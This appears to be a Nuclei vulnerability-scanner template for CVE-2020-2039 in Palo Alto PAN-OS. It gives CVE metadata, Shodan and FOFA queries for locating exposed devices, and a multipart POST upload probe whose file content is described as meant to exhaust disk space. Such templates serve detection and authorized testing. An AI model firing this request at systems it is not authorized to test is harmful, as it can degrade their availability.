id: CVE-2020-2039

info:
  name: Palo Alto Networks PAN-OS Uncontrolled Resource Consumption
  author: ProjectDiscoveryAI
  severity: medium
  description: An uncontrolled resource consumption vulnerability in Palo Alto Networks PAN-OS allows for a remote unauthenticated user to upload temporary files through the management web interface that are not properly deleted after the request is finished.
  impact: |
    Successful exploitation could lead to denial of service (DoS) conditions.
  remediation: |
    Apply the necessary patch or update provided by Palo Alto Networks to mitigate the vulnerability (CVE-2020-2039).
  reference:
    - https://github.com/404notf0und/CVE-Flow
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L
    cvss-score: 5.3
    cve-id: CVE-2020-2039
    cwe-id: CWE-400
    epss-score: 0.00169
    epss-percentile: 0.55023
    cpe: cpe:2.3:o:paloaltonetworks:pan-os:*:*:*:*:*:*:*:*
  metadata:
    vendor: paloaltonetworks
    product: pan-os
    shodan-query:
      - cpe:"cpe:2.3:o:paloaltonetworks:pan-os"
      - http.favicon.hash:"-631559155"
    fofa-query: icon_hash="-631559155"

http:
  - method: POST
    path:
      - "{{BaseURL}}/file-upload"

    body: |
      ------WebKitFormBoundary
      Content-Disposition: form-data; name="file"; filename="tempfile.txt"
      Content-Type: text/plain

      Temporary file content to exhaust disk space.
      ------WebKitFormBoundary--

    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
    matchers:
      - type: word
        words:
          - "File uploaded successfully"
        part: body
